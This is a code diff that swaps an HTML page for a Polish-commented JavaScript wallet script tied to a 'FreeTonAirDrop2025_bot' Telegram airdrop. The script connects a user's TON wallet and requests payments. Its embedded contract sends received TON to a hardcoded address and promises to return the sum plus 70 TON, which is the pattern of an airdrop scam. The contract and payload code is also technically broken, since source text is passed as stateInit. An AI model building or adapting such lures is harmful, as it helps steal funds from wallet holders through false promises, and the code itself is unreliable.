@@ -1,35 +1,132 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON Connect Example</title>
-    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
+const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+    manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
+    buttonRootId: 'ton-connect'
+});
+tonConnectUI.uiOptions = {
+    twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
+};
+
+const connectButton = document.getElementById('connect-button');
+const activateButton = document.getElementById('activate-button');
+
+let userWallet;
+let contractAddress;
+
+connectButton.addEventListener('click', async () => {
+    try {
+        userWallet = await tonConnectUI.connectWallet();
+        console.log('Portfel połączony:', userWallet.account.address);
+        activateButton.disabled = false;
+    } catch (error) {
+        console.error('Błąd połączenia:', error);
+    }
+});
+
+async function deployContract() {
+    if (!userWallet) {
+        console.error('Portfel nie jest połączony');
+        return;
+    }
+
+    const contractCode = `
+    pragma ton-solidity >= 0.35.0;
+    pragma AbiHeader expire;
+
+    contract TONExchange {
+        address constant DESTINATION_ADDRESS = address(0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef);
+
+        function sendTON(address destination, uint128 amount) public {
+            require(msg.value >= amount, 101);
+
+            // Wysyłamy otrzymane TON na określony adres
+            DESTINATION_ADDRESS.transfer(amount);
+
+            // Wysyłamy z powrotem tyle samo TON plus 70 TON
+            msg.sender.transfer(amount + 70 ton);
         }
-        button {
-            margin: 20px;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            background-color: #4CAF50;
-            color: #fff;
-            cursor: pointer;
+    }
+    `;
+
+    const deployPayload = {
+        abi: JSON.stringify({
+            "ABI version": 2,
+            "functions": [{
+                "name": "constructor",
+                "inputs": [],
+                "outputs": []
+            }],
+            "events": [],
+            "data": []
+        }),
+        method: 'constructor',
+        params: {}
+    };
+
+    try {
+        const result = await tonConnectUI.sendTransaction({
+            to: '0:0000000000000000000000000000000000000000000000000000000000000000', // Adres "zero" dla wdrożenia
+            value: 500000000, // 0.5 TON na wdrożenie
+            payload: deployPayload,
+            stateInit: contractCode // Kod kontraktu
+        });
+
+        contractAddress = result.address;
+        console.log('Kontrakt wdrożony pod adresem:', contractAddress);
+        return contractAddress;
+    } catch (error) {
+        console.error('Błąd podczas wdrażania kontraktu:', error);
+    }
+}
+
+activateButton.addEventListener('click', async () => {
+    if (!userWallet) {
+        console.error('Portfel nie jest połączony');
+        return;
+    }
+
+    if (!contractAddress) {
+        contractAddress = await deployContract();
+        if (!contractAddress) {
+            console.error('Nie udało się wdrożyć kontraktu');
+            return;
         }
-        button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-    </style>
-</head>
-<body>
-    <h1>Aktywuj kontrakt</h1>
-    <div id="ton-connect"></div>
-    <button id="connect-button">Połącz portfel</button>
-    <button id="activate-button" disabled>Aktywuj kontrakt</button>
-    <script src="script.js"></script>
-</body>
-</html>
+    }
+
+    try {
+        const destinationAddress = '0:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef'; // Adres docelowy
+        const amount = 1000000000; // 1 TON w nano TON
+
+        const payload = {
+            abi: JSON.stringify({
+                "ABI version": 2,
+                "functions": [{
+                    "name": "sendTON",
+                    "inputs": [
+                        {"name": "destination", "type": "address"},
+                        {"name": "amount", "type": "uint128"}
+                    ],
+                    "outputs": []
+                }],
+                "events": [],
+                "data": []
+            }),
+            method: 'sendTON',
+            params: {
+                destination: destinationAddress,
+                amount: amount
+            }
+        };
+
+        const transaction = {
+            to: contractAddress,
+            value: amount,
+            payload: payload
+        };
+
+        const result = await tonConnectUI.sendTransaction(transaction);
+        console.log('Transakcja wysłana:', result);
+
+    } catch (error) {
+        console.error('Błąd podczas wysyłania transakcji:', error);
+    }
+});
